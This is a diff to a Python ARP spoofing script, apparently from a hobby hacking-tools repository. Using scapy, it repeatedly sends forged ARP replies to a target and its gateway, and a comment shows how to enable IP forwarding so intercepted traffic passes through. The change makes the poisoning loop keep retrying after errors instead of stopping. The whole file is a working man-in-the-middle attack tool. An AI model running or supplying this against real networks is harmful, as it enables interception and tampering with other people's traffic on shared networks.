@@ -2,8 +2,7 @@ import scapy.all as scapy
 import time
 import argparse
 
-# echo 1> /proc/sys/net/ipv4/ip_forward ==> to enable ip forwarding
-# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters (IPEnableRouter = 1)
+# echo 1> /proc/sys/net/ipv4/ip_forward ==> to enable ip forwarding on Linux
 
 parser = argparse.ArgumentParser(description='- ARP Spoofer.', usage='python ARP_Spoofer.py -t <Target> -g <Gateway>')
 parser.add_argument('-t', '--target', required=True, metavar='', help='Specify a target')
@@ -29,18 +28,20 @@ def restore(target_ip, gateway_ip):
     restore = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
     scapy.send(restore, count=4, verbose=0)
 
-try:
-    count = 0
-    print(f'[*] ARP spoofing started on: {args.target}, {args.gateway} ')
-    while True:
+count = 0
+print(f'[*] ARP spoofing started on: {args.target}, {args.gateway} ')
+while True:
+    try:
         spoof(args.target, args.gateway)
         spoof(args.gateway, args.target)
         count += 1
         print('\r[*] Packets sent: ' + str(count), end='')
         time.sleep(2)
-except KeyboardInterrupt:
-    print('\r\n[*] Detected CTRL+C, Restoring ARP tables....')
-    restore(args.target, args.gateway)
-    restore(args.gateway, args.target)
-except:
-    print('\r\n[*] Error connecting to targets!')
+    except KeyboardInterrupt:
+        print('\r\n[*] Detected CTRL+C, Restoring ARP tables....')
+        restore(args.target, args.gateway)
+        restore(args.gateway, args.target)
+        break
+    except:
+        print('\r[*] Retrying connecting to targets...', end='')
+        pass
